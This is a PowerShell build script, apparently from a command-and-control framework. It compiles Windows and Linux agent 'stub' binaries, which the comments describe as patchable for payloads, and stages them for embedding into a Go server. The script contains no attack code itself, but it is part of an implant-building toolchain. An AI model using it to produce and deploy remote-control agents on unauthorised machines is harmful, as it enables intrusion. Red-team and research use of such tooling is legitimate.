# 在本机构建三件套模板：windows_x64 / windows_x86 / linux_amd64（linux 用 Go 交叉编 linuxagent，无需本机 Linux）
# 请在仓库根目录执行：.\scripts\build-stub-templates.ps1（优先用当前目录，避免 PSScriptRoot 中文路径乱码）
$ErrorActionPreference = "Stop"
$scriptParent = Split-Path -Parent $PSScriptRoot
$here = (Get-Location).Path
if (Test-Path (Join-Path $here "go.mod")) {
    $root = $here
} elseif (Test-Path (Join-Path $scriptParent "go.mod")) {
    $root = $scriptParent
} else {
    $root = $here
}
$stubs = Join-Path $root "data\stubs"
$stubbin = Join-Path $root "internal\payload\stubbin"
New-Item -ItemType Directory -Force -Path $stubs, $stubbin | Out-Null

$winSrc = Join-Path $root "client\native\client.cpp"
$inc = Join-Path $root "client\native"
$hasWinClient = Test-Path -LiteralPath $winSrc

function Find-Win86GPlusPlus {
    $e = [Environment]::GetEnvironmentVariable("C2_WIN86_CXX", "Process")
    if ($e -and (Test-Path -LiteralPath $e)) {
        return $e
    }
    $cmd = Get-Command "i686-w64-mingw32-g++.exe" -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    $nested = Join-Path $root ".tools\llvm-mingw-i686"
    if (Test-Path $nested) {
        $hit = Get-ChildItem -Path $nested -Recurse -Filter "i686-w64-mingw32-g++.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($hit) { return $hit.FullName }
    }
    foreach ($p in @(
        "C:\msys64\mingw32\bin\g++.exe",
        "${env:ProgramFiles}\Git\mingw32\bin\g++.exe"
    )) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

# Optional: same g++.exe as x64 with -m32 (needs 32-bit libs; plain mingw64 often fails).
function Get-Win64GPlusPlus {
    $cmd = Get-Command "g++.exe" -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    return $null
}

# --- windows x64 / x86 ---
$out64 = Join-Path $stubs "windows_x64.exe"
if ($hasWinClient) {
Write-Host "Building $out64 ..."
& g++ -O2 -s -static -o $out64 $winSrc "-I$inc" `
  -lws2_32 -lgdi32 -lgdiplus -lbcrypt -liphlpapi -lpsapi -lshell32 -lole32 -luuid -lshlwapi -ladvapi32 -luser32
if ($LASTEXITCODE -ne 0) { throw "windows_x64 build failed" }
Copy-Item -Force $out64 (Join-Path $stubbin "windows_x64.exe")
} else {
    Write-Warning "Skip windows_x64/x86: missing $winSrc (restore client\native\client.cpp to build PE stubs)"
}

# --- windows x86 ---
# 1) 专用 32 位 g++（MSYS2: pacman -S mingw-w64-i686-gcc → C:\msys64\mingw32\bin\g++.exe），与 x64 同源、无需 -m32
# 2) 同一 x64 g++ 加 -m32（需系统带 32 位 MinGW 库；仅 mingw64 无 i686 库时会链接失败）
# 3) i686-w64-mingw32-g++ 等
$out86 = Join-Path $stubs "windows_x86.exe"
$built86 = $false
if (-not $hasWinClient) {
    # 已跳过
} else {
$cxx86 = Find-Win86GPlusPlus
if ($cxx86) {
    Write-Host "Building $out86 with 32-bit toolchain: $cxx86 ..."
    & $cxx86 -O2 -s -static -o $out86 $winSrc "-I$inc" `
      -lws2_32 -lgdi32 -lgdiplus -lbcrypt -liphlpapi -lpsapi -lshell32 -lole32 -luuid -lshlwapi -ladvapi32 -luser32
    if ($LASTEXITCODE -eq 0) { $built86 = $true }
    else { Write-Warning "32-bit g++ build failed (exit $LASTEXITCODE)" }
}
if (-not $built86) {
    $g64 = Get-Win64GPlusPlus
    if ($g64) {
        Write-Host "Building $out86 ($g64 -m32) ..."
        & $g64 -m32 -O2 -s -static -o $out86 $winSrc "-I$inc" `
          -lws2_32 -lgdi32 -lgdiplus -lbcrypt -liphlpapi -lpsapi -lshell32 -lole32 -luuid -lshlwapi -ladvapi32 -luser32
        if ($LASTEXITCODE -eq 0) { $built86 = $true }
        else { Write-Warning "g++ -m32 failed (exit $LASTEXITCODE); install mingw32 libs or MSYS2 package mingw-w64-i686-gcc" }
    }
}
if ($built86) {
    Copy-Item -Force $out86 (Join-Path $stubbin "windows_x86.exe")
    Write-Host "windows_x86.exe OK"
} else {
    Write-Warning "Skip windows_x86: 安装 MSYS2 后执行: pacman -S mingw-w64-i686-gcc，再用 mingw32 终端运行本脚本；或设置 C2_WIN86_CXX 指向 i686-g++.exe"
}
}

# --- linux amd64 ELF：GOOS=linux 交叉编 Go linuxagent（内含 C2EMBED1，与载荷修补兼容）---
$elfOut = Join-Path $stubs "linux_amd64.elf"
Write-Host "Building $elfOut (go cross linux/amd64, CGO_ENABLED=0) ..."
Push-Location $root
try {
    $savedGOOS = $env:GOOS
    $savedGOARCH = $env:GOARCH
    $savedCGO = $env:CGO_ENABLED
    $env:GOOS = "linux"
    $env:GOARCH = "amd64"
    $env:CGO_ENABLED = "0"
    go build -trimpath -ldflags "-s -w" -o $elfOut .\cmd\linuxagent
    if ($LASTEXITCODE -ne 0) { throw "linux_amd64.elf go build failed" }
} finally {
    $env:GOOS = $savedGOOS
    $env:GOARCH = $savedGOARCH
    $env:CGO_ENABLED = $savedCGO
    Pop-Location
}
Copy-Item -Force $elfOut (Join-Path $stubbin "linux_amd64.elf")
Write-Host "linux_amd64.elf OK"

Write-Host "Done. 打入 Go: go build -tags=stubembed"
